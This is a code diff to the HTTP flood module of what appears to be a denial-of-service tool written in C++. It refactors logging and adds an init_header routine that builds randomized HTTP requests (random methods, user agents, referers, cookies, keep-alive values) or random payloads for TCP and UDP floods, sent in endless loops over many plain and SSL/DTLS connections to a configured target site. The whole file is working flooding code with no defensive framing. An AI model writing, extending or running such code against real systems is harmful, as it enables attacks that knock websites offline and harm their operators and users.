@@ -1,12 +1,13 @@
 #include <netdb.h>
 #include <cstring>
+#include <utility>
 #include <unistd.h>
 #include <openssl/ssl.h>
 
 #include "../Headers/Http_Flood.hpp"
 
 
-Http_Flood::Http_Flood(const config *conf, Logger *logger) : Attack_Vector(conf, logger){
+Http_Flood::Http_Flood(std::shared_ptr<Config> conf) : Attack_Vector(std::move(conf)){
 
 }
 
@@ -27,13 +28,13 @@ int Http_Flood::make_socket(const char *host, const char *port, int sock_type) {
     struct addrinfo hints{}, *servinfo, *p;
     int sock = 0, r;
     std::string message = std::string("Connecting-> ") + host + ":" + port;
-    logger->Log(&message, Logger::Info);
+    conf->logger->Log(&message, Logger::Info);
     bzero(&hints, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = sock_type;
     if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
         message = std::string("Getaddrinfo-> ") + gai_strerror(r);
-        logger->Log(&message, Logger::Error);
+        conf->logger->Log(&message, Logger::Error);
         exit(EXIT_FAILURE);
     }
     for(p = servinfo; p != nullptr; p = p->ai_next) {
@@ -50,14 +51,14 @@ int Http_Flood::make_socket(const char *host, const char *port, int sock_type) {
         if(servinfo){
             freeaddrinfo(servinfo);
         }
-        logger->Log("No connection could be made", Logger::Error);
+        conf->logger->Log("No connection could be made", Logger::Error);
         exit(EXIT_FAILURE);
     }
     if(servinfo){
         freeaddrinfo(servinfo);
     }
     message = std::string("Connected-> ") + host + ":" + port;
-    logger->Log(&message, Logger::Info);
+    conf->logger->Log(&message, Logger::Info);
     return sock;
 }
 
@@ -67,7 +68,7 @@ SSL_CTX *Http_Flood::InitCTX() {
     SSL_CTX *ctx;
     ctx = SSL_CTX_new(method);
     if (ctx == nullptr){
-        logger->Log("Unable to connect using ssl", Logger::Error);
+        conf->logger->Log("Unable to connect using ssl", Logger::Error);
         exit(EXIT_FAILURE);
     }
     return ctx;
@@ -77,7 +78,7 @@ SSL *Http_Flood::Apply_SSL(int socket, SSL_CTX *ctx) {
     SSL *ssl = SSL_new(ctx);
     SSL_set_fd(ssl, socket);
     if(SSL_connect(ssl) == -1){
-        logger->Log("Unable to connect using ssl", Logger::Error);
+        conf->logger->Log("Unable to connect using ssl", Logger::Error);
         exit(EXIT_FAILURE);
     }
     return ssl;
@@ -118,32 +119,34 @@ int Http_Flood::write_socket(SSL *ssl, const char *string, int length) {
 void Http_Flood::attack(const int *id) {
     int r;
     std::vector<int> sockets;
+    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
-        sockets.push_back(0);
+        sockets.emplace_back(0);
     }
     while(true) {
         static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
             }
-            const std::string &packet = Randomizer::randomPacket(conf);
-            if((r = write_socket(sockets[x], packet.c_str(), packet.length())) == -1){
+            std::string header{};
+            init_header(header);
+            if((r = write_socket(sockets[x], header.c_str(), header.length())) == -1){
                 cleanup(&sockets[x]);
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
             }else{
                 if(conf->GetResponse){
                     read_socket(sockets[x]);
                 }
                 message = std::string("Socket[") + std::to_string(x) + "->"
                           + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
                 message = std::to_string(*id) + ": Voly Sent";
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
             }
         }
         message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
+        conf->logger->Log(&message, Logger::Info);
         pause();
     }
 }
@@ -153,23 +156,27 @@ void Http_Flood::attack_ssl(const int *id) {
     std::vector<int> sockets;
     std::vector<SSL_CTX *> CTXs;
     std::vector<SSL *> SSLs;
+    sockets.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
+    CTXs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
+    SSLs.reserve(static_cast<unsigned long>(conf->CONNECTIONS));
     for (int x = 0; x < conf->CONNECTIONS; x++) {
-        sockets.push_back(0);
-        SSLs.push_back(nullptr);
-        CTXs.push_back(nullptr);
+        sockets.emplace_back(0);
+        SSLs.emplace_back(nullptr);
+        CTXs.emplace_back(nullptr);
     }
     while(true) {
         static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
             }
-            const std::string &packet = Randomizer::randomPacket(conf);
-            if((r = write_socket(SSLs[x], packet.c_str(), static_cast<int>(packet.length()))) == -1){
+            std::string header{};
+            init_header(header);
+            if((r = write_socket(SSLs[x], header.c_str(), static_cast<int>(header.length()))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), conf->protocol);
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
             }else{
@@ -178,27 +185,62 @@ void Http_Flood::attack_ssl(const int *id) {
                 }
                 message = std::string("Socket[") + std::to_string(x) + "->"
                           + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
                 message = std::to_string(*id) + ": Voly Sent";
-                logger->Log(&message, Logger::Info);
+                conf->logger->Log(&message, Logger::Info);
             }
         }
         message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
+        conf->logger->Log(&message, Logger::Info);
         pause();
     }
 }
 
 const SSL_METHOD *Http_Flood::GetMethod() {
     switch (conf->protocol){
-        case config::TCP:
-            return TLSv1_2_client_method();
+        case Config::TCP:
+            return TLSv1_1_client_method();
+        case Config::UDP:
 #ifdef DTLS_ANY_VERSION
-        case config::UDP:
             return DTLSv1_2_client_method();
+#else
+            conf->logger->Log("Unable to find DTLS", Logger::Info);
+            exit(EXIT_FAILURE);
 #endif
         default:
             return nullptr;
     }
 }
 
+void Http_Flood::init_header(std::string& header) {
+    switch (conf->vector){
+        case Config::UDPFlood:
+        case Config::TCPFlood:
+            header += Randomizer::randomstr();
+            break;
+        case Config::HTTP:{
+            header += Randomizer::random_method() + " /";
+            if(conf->RandomizeHeader){
+                header += Randomizer::randomstr();
+            }
+            header += " HTTP/1.0\r\nUser-Agent: "
+                      + Randomizer::random_useragent(*(conf->useragents))
+                      +" \r\nCache-Control: " + Randomizer::random_caching()
+                      + " \r\nAccept-Encoding: " + Randomizer::random_encoding()
+                      + " \r\nAccept-Charset: " + Randomizer::random_charset() + ", " + Randomizer::random_charset()
+                      + " \r\nReferer: " + Randomizer::random_referer()
+                      + " \r\nAccept: */*\r\nConnection: Keep-Alive"
+                      + " \r\nContent-Type: " + Randomizer::random_contenttype()
+                      + " \r\nCookie: " + Randomizer::randomstr() + "=" + Randomizer::randomstr()
+                      + " \r\nKeep-Alive: " + std::to_string(Randomizer::randomInt(1, 5000))
+                      + " \r\nDNT: " + std::to_string(Randomizer::randomInt(0, 1))
+                      + "\r\n\r\n";
+            break;
+        }
+        default:break;
+    }
+}
+
+void Http_Flood::init_header(std::string& header, bool) {
+
+}
